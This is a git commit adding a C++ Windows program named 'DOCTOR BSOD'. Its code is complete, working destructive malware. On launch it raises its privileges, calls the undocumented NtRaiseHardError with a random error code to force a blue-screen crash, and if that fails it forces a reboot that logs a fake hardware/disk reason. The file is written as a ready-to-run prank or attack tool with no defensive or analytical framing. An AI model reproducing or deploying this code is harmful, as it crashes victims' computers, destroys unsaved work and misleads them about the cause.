29dbed06a05b585b03f584c499995fd50d3de7d9
pankozaC++ <77279607+pankoza2-pl@users.noreply.github.com>
2024-05-06 21:31:29 +0200

    Add files via upload

---
+++ DOCTOR BSOD/DOCTOR BSOD.cpp
@@ -0,0 +1,44 @@
+﻿// DOCTOR BSOD.cpp : This Doctor will cause a BSOD with a random NTSTATUS (error) CODE!!!
+// credits to YT-AleX-1337 for the true NRG
+#include <windows.h>
+//#include <tlhelp32.h>
+typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
+typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+HCRYPTPROV hProv;
+int Random()
+{
+	if (!hProv)
+		CryptAcquireContextA(&hProv, 0, 0, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT);
+
+	int out = 0;
+	CryptGenRandom(hProv, sizeof(out), (BYTE*)(&out)); //Generate random number
+	return out & 0x7FFFFFFF;
+}
+int CALLBACK WinMain(
+	HINSTANCE hInstance, HINSTANCE hPrevInstance,
+	LPSTR     lpCmdLine, int       nCmdShow
+) {
+    SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS); //Max priority class
+	BOOLEAN bl;
+	DWORD response;
+	NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
+	RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
+	RtlAdjustPrivilege(19, 1, 0, &bl);
+	NtRaiseHardError(0xC0000001 + Random() % 0x1A4, 0, 0, 0, 6, &response); //Trigger BSoD
+
+	// If the computer is still running, do it the normal way
+	HANDLE token;
+	TOKEN_PRIVILEGES privileges;
+
+	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);
+
+	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
+	privileges.PrivilegeCount = 1;
+	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);
+
+	// The actual restart
+	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
+	return 0;
+}
